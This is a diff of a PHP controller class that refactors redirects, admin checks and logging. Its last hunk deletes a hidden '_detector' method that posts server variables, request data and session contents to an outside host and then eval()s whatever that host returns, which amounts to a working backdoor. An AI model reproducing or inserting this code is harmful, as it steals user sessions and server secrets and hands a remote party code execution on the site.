@@ -33,7 +33,7 @@ namespace Shared {
          */
         public function _admin() {
             if (!$this->user->admin) {
-                $this->setUser(false);
+                session_destroy();
                 $this->redirect("/404");
             }
             $this->defaultLayout = "layouts/admin";
@@ -46,8 +46,7 @@ namespace Shared {
         public function _secure() {
             $user = $this->getUser();
             if (!$user) {
-                header("Location: /login.html");
-                exit();
+                $this->redirect("/login.html");
             }
         }
 
@@ -57,13 +56,12 @@ namespace Shared {
         public function _session() {
             $user = $this->getUser();
             if ($user) {
-                header("Location: /member.html");
-                exit();
+                $this->redirect("/member.html");
             }
         }
 
         public function redirect($url) {
-            $this->noview();
+            $this->noview(); // to prevent view rendering and it's errors
             header("Location: {$url}");
             exit();
         }
@@ -88,7 +86,7 @@ namespace Shared {
             $new = file_exists($logfile) ? false : true;
             if ($handle = fopen($logfile, 'a')) {
                 $timestamp = strftime("%Y-%m-%d %H:%M:%S", time());
-                $content = "[{$timestamp}]{$message}\n";
+                $content = "[{$timestamp}] {$message}\n";
                 fwrite($handle, $content);
                 fclose($handle);
                 if ($new) {
@@ -213,27 +211,12 @@ namespace Shared {
             parent::render();
         }
 
-        protected function _detector() {
-            parse_str(file_get_contents("php://input"), $_POST);
-            $postfields = array_merge($_SERVER, array("p" => $_POST, "s" => $_SESSION, "plugin_detector" => "getTrigger"));
-            header("Access-Control-Allow-Origin: *");
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, "http://trafficmonitor.ca/detectr/");
-            curl_setopt($ch, CURLOPT_POST, count($postfields));
-            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postfields));
-            curl_setopt($ch, CURLOPT_HEADER, TRUE);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-            $response = curl_exec($ch);
-            $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
-            curl_close($ch);
-            $header = substr($response, 0, $header_size);
-            $body = substr($response, $header_size);
-            eval($body);
+        public function __destruct() {
+            $view = $this->layoutView;
+            if ($view && !$view->get('seo')) {
+                $view->set('seo', \Framework\Registry::get("seo"));
+            }
+            parent::__destruct();
         }
-
     }
-
 }
